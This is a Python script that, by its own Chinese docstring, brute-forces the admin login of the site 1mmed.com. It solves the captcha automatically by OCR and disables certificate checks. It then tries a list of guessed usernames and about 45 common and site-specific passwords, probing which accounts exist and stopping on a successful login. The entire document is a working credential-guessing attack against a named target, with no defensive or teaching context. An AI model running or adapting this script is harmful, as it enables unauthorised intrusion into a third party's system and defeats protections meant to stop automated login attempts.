#!/usr/bin/env python3
"""1mmed.com 后台爆破"""
import urllib.request, http.cookiejar, ssl, sys, time, re
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://1mmed.com"
ocr = ddddocr.DdddOcr(show_ad=False)

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]

def get_captcha():
    try:
        r = op.open(f"{B}/admin.php/Code/index", timeout=8)
        return r.read()
    except Exception:
        return None

def try_login(user, pw, max_attempts=15):
    for i in range(max_attempts):
        cap = get_captcha()
        if cap is None:
            time.sleep(1); continue
        try:
            code = ocr.classification(cap)
        except Exception:
            continue
        if len(code) < 4: continue
        data = f"username={user}&pwd={pw}&code={code}&TenantId=&online=".encode()
        try:
            r = op.open(urllib.request.Request(f"{B}/admin.php", data=data), timeout=8)
            body = r.read().decode("utf-8","ignore")
            if "验证码" in body or "code" in body.lower() and "错误" in body:
                continue
            if "密码" in body or "用户名" in body and ("错误" in body or "不存在" in body):
                return "PASSWORD_WRONG"
            if "index" in r.geturl().lower() and "admin.php" not in r.geturl():
                return f"SUCCESS: {r.geturl()}"
            if len(body) > 3342 + 500 or "退出" in body or "logout" in body.lower():
                return f"POSSIBLE: {body[:80]}"
        except Exception as e:
            return f"ERR:{str(e)[:40]}"
        time.sleep(0.2)
    return "VERIFY_FAIL"

users = ["admin", "admin888", "1mmed", "test", "root", "yimu", "shanghai"]
pwds = ["admin123", "123456", "admin", "admin888", "12345678", "a123456", "admin@123",
        "123123", "111111", "888888", "000000", "123456789", "abc123", "passw0rd",
        "Admin123", "Admin888", "yimu123", "yimu888", "1mmed123", "shanghai123",
        "admin2024", "admin2025", "admin2026", "qwe123", "zxc123", "147258369",
        "5201314", "woaini", "123456a", "Aa123456", "admin!@#", "admin#123",
        "123qwe", "asd123", "1234567890", "1qaz2wsx", "qazwsx", "zxcvbnm",
        "admin123456", "Admin@123", "admin666", "admin999", "test123", "test123456"]

for u in users:
    print(f"--- {u} ---", flush=True)
    for pw in pwds:
        r = try_login(u, pw)
        if r == "VERIFY_FAIL":
            print(f"  {u}/{pw}: 验证码多次失败", flush=True)
            break
        if r == "PASSWORD_WRONG":
            print(f"  !!! 用户存在: {u}", flush=True)
            break
        if r != "PASSWORD_WRONG" and "ERR" not in r and r != "VERIFY_FAIL":
            print(f"  {u}/{pw}: {r}", flush=True)
            if "SUCCESS" in r or "POSSIBLE" in r:
                sys.exit(0)
        time.sleep(0.15)
print("DONE")
